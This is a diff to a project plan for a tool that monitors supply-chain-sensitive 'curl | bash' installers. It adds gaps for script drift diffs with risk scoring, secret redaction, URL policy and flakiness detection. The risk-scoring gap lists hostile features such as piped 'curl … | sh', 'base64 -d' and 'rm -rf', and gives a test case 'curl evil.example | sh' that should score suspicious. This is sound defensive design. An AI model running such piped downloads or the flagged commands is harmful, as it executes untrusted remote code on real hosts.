@@ -753,9 +753,213 @@ Waves for a swarm (beads inside a wave are independent unless noted):
 - **Disk pressure on hosts** (this box sits at 97%): document image sizes; `check --reap` and result retention
   keep growth bounded.
 
+### 4.9 Ambition round 1: beyond the README (what a canary for supply-chain-sensitive installers must do)
+
+The README describes a checker. ACFS's fail-closed checksum policy exists because `curl | bash` installers
+are a supply-chain surface. A tool that only says "hash changed" leaves the hard question (is this change
+legitimate?) to a human with no evidence. Round 1 adds the capabilities that make the tool decisive.
+
+#### Gap A1: Script provenance ledger and drift diff with risk scoring — NOT_STARTED → WORKING
+
+**Current state:** on drift the tool reports two hashes. Nothing stores what the script used to be.
+**Target state:** every verified script is stored content-addressed under `<data_dir>/scripts/<installer>/
+<sha256>.sh` with a small index (first seen, last verified pass, run ids). On drift (`validate --check-hashes`,
+`check`, `remediate checksums`), the tool renders a unified diff between the last verified-pass script and the
+new one and a risk report computed from the diff: added network destinations (new hosts or URLs), changed
+download URLs or version pins, added `sudo`, `rm -rf`, `chmod 777`, `eval`, `base64 -d`, `curl … | sh`
+nesting, added lines with high Shannon entropy (opaque blobs), size delta, and whether the change is confined
+to version strings. Output: a score (`routine | review | suspicious`) with the triggering features listed,
+in human, JSON, markdown (for the canary issue), and in the notification body. This is what lets a reviewer
+approve the deterministic checksum refresh (C12a) with evidence.
+**Success criteria:** unit tests with synthetic before/after scripts for each feature; a version-bump-only
+diff scores `routine`; an added `curl evil.example | sh` scores `suspicious`; ledger survives retention
+pruning (scripts are small; keep the last 5 per installer).
+**Dependencies:** C4 (data dir, run header), C12a (consumer). **Complexity:** M. **Vision goals served:** 2,
+6, 13.
+
+#### Gap A2: Post-install verification and installed-version capture — PARTIAL → WORKING
+
+**Current state:** README lists "no post-install validation" as a limitation; M2 adds `expect_binary`.
+**Target state:** `[installers.<name>]` gains `verify_cmd` (run in the container after a passing install,
+non-zero → category `post_install`) and `version_cmd` (its first line is stored as `installed_version` in the
+result). Built-in profile defaults for the obvious cases (`zoxide --version`, `bun --version`,
+`uv --version`, `cargo --version` after rust, `claude --version`, `node --version` after nvm). The baseline
+document (C10b) and `status --history` (A8) show version timelines, so "bun 1.2.3 → 1.2.4 on 2026-09-07"
+becomes visible without reading logs.
+**Success criteria:** Docker test: zoxide result carries `installed_version` matching `zoxide --version`; a
+failing `verify_cmd` yields `post_install`.
+**Dependencies:** M2, C4. **Complexity:** S. **Vision goals served:** 3, 20.
+
+#### Gap A3: `doctor` command — NOT_STARTED → WORKING
+
+**Current state:** the README troubleshooting section lists four symptoms; the tool cannot diagnose its own
+environment.
+**Target state:** `doctor [--format json]` checks and reports (pass/warn/fail with a fix hint): Docker
+reachable and version; prepared image present and its age; ACFS repo path and `checksums.yaml` parse;
+`KNOWN_INSTALLERS` cross-check summary; data dir and log dir writable; free disk on the Docker root and the
+data dir; `claude` and `gh` presence and versions (only when remediation or notifications need them);
+notification env vars set (names only); systemd units rendered and installed (when the install path exists);
+config unknown keys; last run age; leaked `afsc.managed` containers. Exit 0 when nothing failed. Same output
+also embedded in the run header as `environment` (abridged) for reproducibility.
+**Success criteria:** CLI tests for each check with the environment manipulated; `doctor --format json` is one
+document; README troubleshooting section points at it.
+**Dependencies:** C5, C7. **Complexity:** M. **Vision goals served:** 22, 17.
+
+#### Gap A4: Container resource telemetry — NOT_STARTED → WORKING
+
+**Current state:** results record duration only; memory limits are guessed.
+**Target state:** after each attempt the executor reads Docker stats (one-shot `stats` call before cleanup)
+and records `peak_memory_bytes`, `cpu_seconds`, `net_rx_bytes`, `net_tx_bytes` on the result; `status
+--detailed` and the baseline show them; Prometheus gains `afsc_installer_peak_memory_bytes`; M2 can set
+per-installer `memory_limit` with evidence.
+**Success criteria:** Docker test: a memory-hog fixture reports peak memory above 100 MiB; a trivial fixture
+below 50 MiB.
+**Dependencies:** C4. **Complexity:** S. **Vision goals served:** 1, 9.
+
+#### Gap A5: Concurrency safety across processes — NOT_STARTED → WORKING
+
+**Current state:** the base-image build lock is in-process only; `metrics.json` is read-modify-write with no
+lock; two `check` processes (systemd timer plus a manual run) can interleave.
+**Target state:** a file lock at `<data_dir>/locks/run.lock` taken by `check` (fail fast with exit 3 and a
+message naming the other pid unless `--allow-concurrent`), a separate lock for image builds, and atomic
+writes (temp file + rename) for `metrics.json` and the ledger index. `serve` never takes the run lock.
+**Success criteria:** CLI test: two concurrent `check` invocations, the second exits 3 immediately; with
+`--allow-concurrent` both complete and both result files exist.
+**Dependencies:** C4, C5. **Complexity:** S. **Vision goals served:** 8, 11.
+
+#### Gap A6: Secret redaction in captures, logs, and notifications — NOT_STARTED → WORKING
+
+**Current state:** installer stdout/stderr are persisted and sent to Slack/GitHub verbatim; an installer
+that prints its environment would leak tokens.
+**Target state:** a redaction pass over persisted tails, notification bodies, and structured log events using
+patterns for GitHub tokens (`ghp_`, `github_pat_`), Slack (`xox[abp]-`), AWS (`AKIA…`), Anthropic/OpenAI
+(`sk-…`), generic `token=|password=|secret=` values, and long base64/hex runs following those keys;
+replacement `[redacted:<kind>]`; the run header lists env var names passed to containers, never values.
+**Success criteria:** unit tests per pattern; CLI test that a fixture printing `GITHUB_TOKEN=ghp_xxx`
+persists `[redacted:github_token]`.
+**Dependencies:** C4, M5, M7. **Complexity:** S. **Vision goals served:** 7, 15.
+
+#### Gap A7: Run deadline and longest-first scheduling — NOT_STARTED → WORKING
+
+**Current state:** a run has no overall deadline; installers run in HashMap order.
+**Target state:** `execution.run_deadline_seconds` (default 0 = none; the systemd config and canary set it)
+cancels remaining work at the deadline with status `Cancelled(deadline)`; `execution.order =
+longest-first | name | manifest` (default `longest-first` when history exists) orders installers by their
+historical median duration descending, the classic LPT heuristic that minimizes makespan for `--parallel N`
+(measurably shorter nightly runs when one installer dominates, as `srps` at 110 s does today).
+**Success criteria:** unit test of the ordering; CLI test that a 2 s deadline cancels a 10 s fixture with the
+right status and exit code.
+**Dependencies:** C7, C5, A8 (history). **Complexity:** S. **Vision goals served:** 4, 21.
+
+#### Gap A8: Run history, diffs, rerun-failed, and flakiness detection — NOT_STARTED → WORKING
+
+**Current state:** `status` shows one run; comparing runs means reading files.
+**Target state:** `status --history <installer> [--last N]` prints a pass/fail and duration timeline with
+installed versions (A2) and script hashes (A1); `status --diff <run-a> <run-b>` lists state changes;
+`check --failed-from <run-id|last>` reruns only failures; a flakiness detector marks an installer `flaky`
+when its recent pass rate over unchanged script hashes is below a threshold, and `broken since <run>` when a
+change-point is detected. Detector: per installer, treat outcomes since the last script change as Bernoulli
+trials; a Beta(1,1) posterior on pass probability gives `P(pass) < 0.9` → flaky; a CUSUM over the same series
+(fail = +1, pass = −k) crossing a threshold marks the change-point, which is cheap, deterministic, and easy
+to explain in the canary issue ("failing 6 of the last 6 runs since run 2026-09-05, script unchanged").
+**Success criteria:** unit tests for the detector on synthetic series (stable pass, intermittent, step
+change); CLI tests for `--history`, `--diff`, `--failed-from`.
+**Dependencies:** C4. **Complexity:** M. **Vision goals served:** 8, 12.
+
+#### Gap A9: Classifier golden corpus and explainability — UNPROVEN → WORKING
+
+**Current state:** classifier tests use eleven hand-written fixtures; real installer output has never been
+captured.
+**Target state:** the full-catalog run (C10b) and the nightly canary archive stderr/stdout tails of every
+failure into `tests/fixtures/error_outputs/real/<installer>-<date>.txt` (redacted, A6) with an expected
+category in a table file; table-driven tests; `classify-error --explain` prints the matching pattern and
+its position; a precision report (`classify-error --report tests/fixtures/error_outputs`) prints per-category
+counts and unknowns so pattern gaps are visible.
+**Success criteria:** table-driven test over the corpus; `unknown` rate below 10% on the real corpus.
+**Dependencies:** C10b, A6. **Complexity:** S. **Vision goals served:** 3.
+
+#### Gap A10: URL policy and file:// gating — PARTIAL → WORKING
+
+**Current state:** any URL scheme is accepted; `file://` works everywhere (useful for tests, dangerous for a
+poisoned checksums.yaml pointing at `http://`).
+**Target state:** `validate` and `check` enforce `https://` like ACFS's `enforce_https`; `file://` requires
+`--allow-file-urls` (set automatically by the test harness) and is reported in the run header; `http://` is
+an error with the installer name.
+**Success criteria:** CLI tests for each scheme.
+**Dependencies:** C5. **Complexity:** S. **Vision goals served:** 2, 13.
+
+#### Gap A11: ACFS PR gate — NOT_STARTED → WORKING
+
+**Current state:** ACFS's own canary tests the full installer nightly; nothing checks a `checksums.yaml`
+change before it merges.
+**Target state:** `check --acfs-ref <git-ref>` and `validate --acfs-ref` fetch the ref into a temp worktree
+of the configured ACFS repo and use its `checksums.yaml`; a reusable workflow
+(`.github/workflows/acfs-pr-gate.yml` with `workflow_call` inputs `acfs_repo`, `ref`, `installers`) runs
+`validate --check-hashes` and `check` for the installers whose entries changed in the diff and posts a
+markdown summary; ACFS's CI can call it on pull requests that touch `checksums.yaml` or `security.sh`.
+**Success criteria:** CLI test with a temp git repo and two refs; a manual `workflow_dispatch` against an
+ACFS branch produces the summary.
+**Dependencies:** C11, M9. **Complexity:** M. **Vision goals served:** 12, 13.
+
+#### Gap A12: Notification digest and change-only mode — PARTIAL → WORKING
+
+**Current state:** notifications fire per run.
+**Target state:** `notifications.mode = every_run | on_change | daily_digest`; `on_change` (default) sends
+only when the set of failing installers or drifted checksums changed versus the previous run (uses A8 diffs);
+`daily_digest` accumulates and sends once per day via the `notify --digest` subcommand (systemd timer or the
+canary). The canary issue uses `on_change` so it comments only on transitions.
+**Success criteria:** wiremock tests for each mode with two consecutive runs.
+**Dependencies:** M5, A8. **Complexity:** S. **Vision goals served:** 15.
+
+#### Gap A13: Reproducibility fields and schema versioning — PARTIAL → WORKING
+
+**Current state:** results do not record the image id or the script hash actually executed; output schemas
+have no version.
+**Target state:** the run header gains `schema_version`, `image_id` (Docker image id, not just the tag),
+`environment` (abridged doctor output, A3); each result records `script_sha256` executed and
+`installed_version` (A2); JSON/JSONL consumers can rely on `schema_version` and a documented compatibility
+policy (additive changes only within a major).
+**Success criteria:** unit test that `schema_version` is present in every output kind; docs section.
+**Dependencies:** C4, A3. **Complexity:** S. **Vision goals served:** 7, 8.
+
+### 4.10 Ambition round 2: harmonization, ordering, and where the math earns its place
+
+Round 2 reviewed rounds 0 and 1 together and made these changes (already reflected above and in the beads):
+
+1. **Deterministic first, model second.** C12a (checksum refresh) plus A1 (diff and risk score) resolve the
+   majority of real failures with no LLM and produce reviewable evidence. C12b advisory consumes A1's risk
+   report in its prompt so Claude explains a suspicious diff instead of re-deriving it. C12c stays P3.
+2. **One history model feeds five features.** A8's run history (from C4 result files) powers longest-first
+   scheduling (A7), change-only notifications (A12), the canary issue text (C11), the baseline diff (C10b),
+   and flakiness detection. Build A8 right after C4, before those consumers.
+3. **Bollard over the docker CLI.** M3 uses Bollard's build API so the tool depends on the socket only; the
+   `docker` binary becomes optional (doctor reports it).
+4. **Two locks, not one.** A5's run lock protects the data dir; the image-build lock is separate so `serve`
+   and `doctor` never block on a running check.
+5. **Detector choice.** For flakiness and change-points the plan uses a Beta-Binomial posterior and a CUSUM,
+   not a learned model: a nightly series has tens of points, the statistics are explainable in one sentence
+   inside a GitHub issue, and both are deterministic and unit-testable. Diff risk scoring likewise uses
+   named features plus Shannon entropy of added lines; the features are the explanation.
+6. **Split M10.** The smoke-test fix lands in wave 0 (`M10a`); the blocking Docker and CLI jobs land with the
+   suites (`M10b`).
+7. **Every implementation bead has a companion test bead or inline test criteria; the FINAL bead re-runs
+   section 4.6 plus the A-series criteria.**
+
+Updated counts: 14 critical, 14 major, 9 minor, 13 ambition (50 gaps). Updated waves:
+
+| Wave | Beads |
+|------|-------|
+| 0 | C14a, M10a, m6 |
+| 1 | C1, C2, C3, C4, C5, C7, M4, m9, A10 |
+| 2 | C6, M2, M1, M3, M9, M14, m1, m2, m3, A5, A6, A13, A8 |
+| 3 | C8a-d, C9, M8a-b, M11, C10a-b, A2, A4, A9 |
+| 4 | M5, M6, M7, C13a-b, m8, A3, A7, A12 |
+| 5 | C12a, C12d, C12b, A1, C12e, (C12c P3) |
+| 6 | C11, A11, M12, M13, m7, C14b, m4, M10b, FINAL |
+
 ## 5. Next step
 
-Phase 3a: convert sections 4.2 to 4.6 into beads with `br` using the frozen template (one epic per wave or per
-gap cluster, implementation beads plus companion test beads, dependencies as in 4.5, and the final
-integration bead from 4.6), then 2 to 3 ambition rounds revising this document in place, then 4 to 5
-plan-space refinement rounds, then `bv --robot-triage` before implementation.
+Phase 3a is done for sections 4.2 to 4.6 (66 beads under epic `automated_flywheel_setup_checker-jmu`);
+the round-1 additions (A1 to A13) and the round-2 split (M10a/M10b) are added as beads next, then 4 to 5
+plan-space refinement rounds over every bead (frozen refinement prompt), then `bv --robot-triage`, then
+implementation starting at wave 0.
